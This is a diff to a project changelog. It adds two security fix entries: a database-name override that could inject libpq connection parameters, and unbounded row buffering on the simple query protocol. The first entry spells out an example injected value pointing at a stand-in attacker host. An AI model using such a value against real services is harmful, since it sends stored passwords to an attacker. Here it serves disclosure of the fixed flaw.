@@ -1613,6 +1613,32 @@ project adheres to
   webhook `http_method` other than `GET`, `POST`, `PUT` or `PATCH` when
   a channel is created or updated. (#498)
 
+- Stop an optional database name from adding connection parameters of
+  its own choosing. The database override accepted by
+  `POST /api/v1/connections/{id}/query`, by the MCP tools that take a
+  `database_name` argument, and by a saved MCP session was pasted
+  straight into the connection string, so a name such as
+  `mydb?host=evil.example.com&sslmode=disable` ended the path and
+  appended libpq parameters, sending the connection, and the stored
+  password with it, to a host of the caller's choosing. The connection
+  string is now assembled with the URL builder, which escapes the path
+  and the query by construction, and a name that cannot name a real
+  database, being empty, longer than 63 bytes, or carrying a NUL or
+  another control character, is refused at all three call sites. Stored
+  connections themselves are unchanged, and a caller who could not
+  already reach a connection still cannot. (#530)
+
+- Bound the rows held in memory when a statement runs over the simple
+  query protocol, which is the path taken by an `EXPLAIN` containing a
+  `$1` placeholder. That path could not add a `LIMIT` clause, because it
+  sends the statement text unaltered, and it kept every row the server
+  returned, so a large result could exhaust the server's memory. Rows
+  past the same 500-row limit the ordinary path applies are now read but
+  not kept, and the response reports the result as truncated in the way
+  it already does elsewhere. The rest of the result is still read, so
+  the connection remains usable for the following statements in the
+  request. (#530)
+
 - Classify an `EXPLAIN` statement by the statement it explains, so that
   `EXPLAIN ANALYZE` over a data-modifying statement goes through the
   write-access check and the write-confirmation prompt.
